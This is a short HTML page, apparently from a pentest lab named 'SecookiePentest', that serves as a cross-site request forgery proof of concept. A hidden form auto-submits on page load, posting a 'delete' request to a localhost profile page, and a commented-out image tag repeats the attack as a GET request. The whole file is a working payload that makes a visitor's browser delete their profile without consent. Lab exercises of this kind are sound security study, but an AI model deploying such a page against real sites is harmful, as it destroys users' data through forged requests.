<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title>Login</title>
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css">
        <link href="style.css" rel="stylesheet" type="text/css">
    </head>
	<body>
		<div class="login">
			<h1>Vulnerable site</h1>
			<!-- <img src="http://localhost/SecookiePentest/profile.php?delete=1" alt="..."> -->
			<form id="csrf" method="post" action="http://localhost/SecookiePentest/profile.php">
				<input type="submit" name="delete" 
				value="Delete now!"/>
			</form>
			<script>
				document.getElementById('csrf').submit();
			</script>
		</div>
	</body>
</html>
